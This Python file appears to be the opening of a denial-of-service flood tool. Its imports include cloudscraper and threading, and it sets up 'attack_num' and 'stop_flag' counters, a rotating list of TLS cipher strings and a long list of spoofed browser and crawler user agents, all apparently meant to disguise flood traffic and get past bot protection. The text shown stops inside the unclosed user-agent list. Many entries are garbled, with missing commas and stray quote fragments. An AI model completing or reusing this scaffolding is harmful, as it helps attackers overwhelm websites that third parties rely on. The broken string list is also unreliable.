import os
import sys
import time
import requests
import logging
import socket
import threading
import json
import random
import ssl
import httpx
import random
import ssl
import string
import threading
import logging
import time
import cloudscraper
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from random import randint
import requests, time, os
import socket
from datetime import datetime, date
from pystyle import Write, System, Colors, Colorate, Anime, Center
from time import strftime
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from colored import fg,attr
init(autoreset=True)

# Global variables
logging.basicConfig(level=logging.INFO, format='%(message)s')
stop_flag = threading.Event()
attack_num = 0
cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256",
    "AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256",
    "AES256-SHA:AES128-SHA:DES-CBC3-SHA",
    "ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES256-SHA",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256",
    "AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA",
    "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256",
    "AES128-GCM-SHA256:AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256",
    "ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256",
    "AES128-SHA:AES256-SHA:AES128-SHA256:AES256-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256",
    "DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256",
    "AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA",
]

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.48',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.48',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
    'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0',
    'Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.172',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.177',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.117 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')"
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')"
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')"
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')"
 "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')"
 "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')"
 "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')"
 "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')"
 "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')"
 "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')"
 "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')"
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')"
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')"
 "Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')"
 "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')"
